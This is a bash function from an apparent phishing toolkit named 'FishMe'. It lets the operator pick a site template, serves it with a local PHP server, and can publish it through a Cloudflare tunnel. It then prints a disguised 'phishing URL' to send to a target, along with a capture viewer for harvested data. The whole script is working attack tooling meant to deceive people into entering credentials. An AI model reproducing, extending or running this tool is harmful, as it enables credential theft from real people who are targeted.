start_server() {
    check_php
    clear
    echo -e "${CYAN}"
    echo -e "  ▄████████  ▄█     ▄████████    ▄█    █▄      ▄▄▄▄███▄▄▄▄      ▄████████ "
    echo -e "  ███    ███ ███    ███    ███   ███    ███   ▄██▀▀▀███▀▀▀██▄   ███    ███ "
    echo -e "  ███    █▀  ███▌   ███    █▀    ███    ███   ███   ███   ███   ███    █▀  "
    echo -e " ▄███▄▄▄     ███▌   ███         ▄███▄▄▄▄███▄▄ ███   ███   ███  ▄███▄▄▄     "
    echo -e "▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ███   ███   ███ ▀▀███▀▀▀     "
    echo -e "  ███        ███           ███   ███    ███   ███   ███   ███   ███    █▄  "
    echo -e "  ███        ███     ▄█    ███   ███    ███   ███   ███   ███   ███    ███ "
    echo -e "  ███        █▀    ▄████████▀    ███    █▀     ▀█   ███   █▀    ██████████ "
    echo
    echo -e "${CYAN}=============================================================${RESET}"
    echo -e "    ${WHITE} v${__version__}${RESET}"
    echo -e "${CYAN}=============================================================${RESET}"
    echo -e "  ${DIM}Select a site template to launch${RESET}"
    echo -e "${CYAN}=============================================================${RESET}"
    echo

    SITES=()
    if [[ -d "${SITES_ROOT}" ]]; then
        for d in "${SITES_ROOT}"/*/; do
            [[ -f "${d}index.php" ]] && SITES+=("$(basename "$d")")
        done
    fi

    if [[ ${#SITES[@]} -eq 0 ]]; then
        echo -e "${RED}[!]${RESET} No sites found in ${SITES_ROOT}"
        exit 1
    fi

    cols=3
    i=1
    for s in "${SITES[@]}"; do
        printf " ${GREEN}%-3s${RESET} %-20s" "[$i]" "$s"
        if (( i % cols == 0 )); then echo; fi
        ((i++))
    done
    if (( (i-1) % cols != 0 )); then echo; fi

    echo
    echo -e "${CYAN}=============================================================${RESET}"
    read -p "  ${CYAN}[?]${RESET} Enter option number: " opt

    if [[ "${opt}" =~ ^[0-9]+$ && ${opt} -ge 1 && ${opt} -le ${#SITES[@]} ]]; then
        SITE_NAME="${SITES[$((opt-1))]}"
    else
        echo -e "${RED}[!]${RESET} Invalid option. Exiting."
        exit 1
    fi

    echo
    read -n1 -p "${CYAN}[?]${RESET} Use custom port? [y/N]: " ans
    echo
    if [[ ${ans,,} == "y" ]]; then
        read -p "${CYAN}[-]${RESET} Enter port [1024-9999]: " cu_p
        if [[ "${cu_p}" =~ ^([1-9][0-9][0-9][0-9])$ ]] && [[ ${cu_p} -ge 1024 ]]; then PORT=${cu_p}; fi
    fi

    echo
    read -n1 -p "${CYAN}[?]${RESET} Use Cloudflare tunnel for public URL? [y/N]: " cf_ans
    echo

    CF_PID=""
    CF_URL=""
    USE_CF=0
    if [[ ${cf_ans,,} == "y" ]]; then
        if ! check_cloudflared; then
            echo -e "  ${ORANGE}[!]${RESET} cloudflared not found."
            read -n1 -p "  ${CYAN}[?]${RESET} Install it now? [y/N]: " inst_ans
            echo
            if [[ ${inst_ans,,} == "y" ]]; then
                install_cloudflared || { echo -e "  ${RED}[!]${RESET} Skipping Cloudflare tunnel."; }
            fi
        fi
        if check_cloudflared; then
            USE_CF=1
        fi
    fi

    echo -e "\n${GREEN}[+]${RESET} Starting FishMe server..."
    echo -e "${CYAN}[-]${RESET} Site    : ${BOLD}${SITE_NAME}${RESET}"
    echo -e "${CYAN}[-]${RESET} Local   : ${BOLD}http://${HOST}:${PORT}/templates/${SITE_NAME}/${RESET}"
    echo -e "${CYAN}[-]${RESET} Viewer  : ${BOLD}http://${HOST}:${PORT}/viewer.php${RESET}"

    # Start PHP server using router.php so phishing-path URLs work
    cd "${BASE_DIR}" || exit 1
    FISHME_ACTIVE_SITE="${SITE_NAME}" php -S "${HOST}:${PORT}" "${BASE_DIR}/router.php" >/dev/null 2>&1 &
    PHP_PID=$!

    if [[ $USE_CF -eq 1 ]]; then
        echo -e "${CYAN}[~]${RESET} Starting Cloudflare tunnel..."
        local cf_log
        cf_log=$(mktemp)

        # Find cloudflared binary
        local cf_bin
        cf_bin=$(command -v cloudflared 2>/dev/null || echo "${BASE_DIR}/cloudflared")

        "$cf_bin" tunnel --url "http://${HOST}:${PORT}" --logfile "$cf_log" >/dev/null 2>&1 &
        CF_PID=$!

        # Wait for tunnel URL (max 15 seconds)
        local attempts=0
        while [[ $attempts -lt 30 ]]; do
            CF_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$cf_log" 2>/dev/null | head -1)
            [[ -n "$CF_URL" ]] && break
            sleep 0.5
            ((attempts++))
        done

        if [[ -n "$CF_URL" ]]; then
            local phish_path
            phish_path=$(generate_phish_url "$SITE_NAME")
            # Active phishing URL = real tunnel URL + phishy path (router.php redirects to template)
            local active_phish_url="${CF_URL}/${phish_path}/"
            local viewer_link="${CF_URL}/viewer.php"
            echo
            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
            echo -e "${GREEN}         CLOUDFLARE TUNNEL ACTIVE         ${RESET}"
            echo -e "${GREEN}══════════════════════════════════════════════════════════════${RESET}"
            echo
            echo -e "  ${RED}[🎣]${RESET} ${BOLD}Phishing URL (send to target):${RESET}"
            echo -e "      ${RED}${BOLD}${active_phish_url}${RESET}"
            echo
            echo -e "  ${GREEN}[✓]${RESET} Capture viewer : ${WHITE}${BOLD}${viewer_link}${RESET}"
            echo -e "  ${DIM}[-]${RESET} Direct tunnel  : ${DIM}${CF_URL}/templates/${SITE_NAME}/${RESET}"
            echo
            echo -e "  ${DIM}↑ The red URL is ACTIVE — it redirects to the real phishing page via Cloudflare.${RESET}"
            echo
        else
            echo -e "  ${RED}[!]${RESET} Could not get tunnel URL. Check network and try again."
        fi
    fi

    echo -e "${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
    echo

    # Cleanup function
    cleanup() {
        echo -e "\n${CYAN}[~]${RESET} Shutting down..."
        [[ -n "$PHP_PID" ]] && kill "$PHP_PID" 2>/dev/null
        [[ -n "$CF_PID" ]] && kill "$CF_PID" 2>/dev/null
        echo -e "${GREEN}[+]${RESET} Done."
        exit 0
    }
    trap cleanup SIGINT SIGTERM

    wait "$PHP_PID"
}

